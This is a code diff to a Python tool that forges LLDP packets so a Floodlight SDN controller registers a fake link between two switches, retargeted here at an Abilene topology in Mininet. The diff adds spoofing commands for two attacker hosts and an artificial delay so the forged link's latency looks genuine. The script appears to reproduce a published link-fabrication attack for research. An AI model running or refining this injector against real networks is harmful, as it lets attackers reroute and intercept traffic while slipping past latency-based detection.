@@ -25,12 +25,28 @@ Verified LLDP TLV layout (from captured Floodlight packets):
   TLV 127 Org-Spec #2 : type=127, len=12 → OUI(3)+sub=1(1)+probe_counter(8) [unchanged]
   TLV 0   End
 
-Usage (from Mininet xterms):
-  a1:  sudo python3 fake_lldp_inject.py --iface a1-eth0 --spoof-dpid 3 --spoof-port 4
-  a2:  sudo python3 fake_lldp_inject.py --iface a2-eth0 --spoof-dpid 2 --spoof-port 4
+Abilene Topology — Wormhole between s4 (Seattle, DPID=4) and s8 (Kansas City, DPID=8)
+─────────────────────────────────────────────────────────────────────────────────────────
+Port layout (derived from Abilene.json edge order + EXTRA_HOSTS order in abilene.py):
+
+  s4 port 1 : s5 (Sunnyvale)       s8 port 1 : s7 (Denver)
+  s4 port 2 : s7 (Denver)          s8 port 2 : s9 (Houston)
+  s4 port 3 : h4 (std host)        s8 port 3 : s11 (Indianapolis)
+  s4 port 4 : ha (extra host)      s8 port 4 : h8 (std host)
+  s4 port 5 : a1 (attacker)        s8 port 5 : hb (extra host)
+                                   s8 port 6 : a2 (attacker)
+
+Goal: make Floodlight believe there is a direct link s4:5 ↔ s8:6
+
+Usage (from Mininet xterms or with mnexec):
+  a1:  sudo python3 fake_lldp_inject.py --iface a1-eth0 --spoof-dpid 8 --spoof-port 6
+  a2:  sudo python3 fake_lldp_inject.py --iface a2-eth0 --spoof-dpid 4 --spoof-port 5
+
+  a1 is on s4 port 5 — it injects LLDP claiming to be s8 port 6
+  a2 is on s8 port 6 — it injects LLDP claiming to be s4 port 5
 
 Result:
-  Floodlight's Link Discovery Service registers fake link: s2:4 <-> s3:4
+  Floodlight's Link Discovery Service registers fake link: s4:5 ↔ s8:6
   Verify: curl http://localhost:8080/wm/topology/links/json | python3 -m json.tool
 """
 
@@ -54,7 +70,7 @@ FLOODLIGHT_SUB_DPID = 0x00
 # Injection interval tuned to Floodlight's default LLDP probe rate (~15s).
 # Paper: "the adversary could tune the LLDP injecting rate to the LLDP
 #         sending rate monitored from the OpenFlow controller."
-DEFAULT_INTERVAL      = 5       # seconds between injections
+DEFAULT_INTERVAL      = 5      # seconds between injections
 DEFAULT_REFRESH_EVERY = 6       # re-sniff every N injections (~every 30s)
 SNIFF_TIMEOUT         = 30      # seconds to wait for a genuine LLDP frame
 
@@ -209,11 +225,17 @@ def main():
 +----------------------------------------------------------+
 |      Fake LLDP Injector -- Link Fabrication Attack       |
 |      TopoGuard NDSS 2015, Section III.C                  |
+|      Abilene topology: s4 (DPID=4) <-> s8 (DPID=8)      |
 +----------------------------------------------------------+
 |  Interface  : {args.iface:<43}|
-|  Spoof DPID : {args.spoof_dpid:<43}|
+|  Spoof DPID : s{args.spoof_dpid} (DPID={args.spoof_dpid}){'':<35}|
 |  Spoof Port : {args.spoof_port:<43}|
 |  Interval   : {str(args.interval) + 's':<43}|
+|                                                          |
+|  a1-eth0: --spoof-dpid 8 --spoof-port 6                 |
+|           (a1 on s4:5, claims to be s8:6)               |
+|  a2-eth0: --spoof-dpid 4 --spoof-port 5                 |
+|           (a2 on s8:6, claims to be s4:5)               |
 +----------------------------------------------------------+
 """)
 
@@ -232,10 +254,18 @@ def main():
     # Step 3 — inject in a loop at the controller's probe rate
     # Paper: "the adversary could tune the LLDP injecting rate to the LLDP
     #         sending rate monitored from the OpenFlow controller"
-    print(f"\n[*] Injecting forged LLDP every {args.interval}s  (Ctrl+C to stop)\n")
+    #
+    # Add an artificial delay before re-injection so the fake link's measured
+    # LLDP RTT approximates the real inter-switch link latency (≈ BASE_DELAY_MS
+    # in abilene.py). Without this, fake-link RTT is ~1–5 ms while real links
+    # are ~50 ms, which distorts Floodlight's latency-weighted routing.
+    FAKE_LINK_DELAY = 0.025   # seconds; match BASE_DELAY_MS in abilene.py
+    print(f"\n[*] Injecting forged LLDP every {args.interval}s "
+          f"(+{int(FAKE_LINK_DELAY*1000)}ms artificial latency)  (Ctrl+C to stop)\n")
     count = 0
     try:
         while True:
+            time.sleep(FAKE_LINK_DELAY)
             sendp(pkt, iface=args.iface, verbose=False)
             count += 1
             print(f"    [->] Packets injected: {count}", end="\r", flush=True)
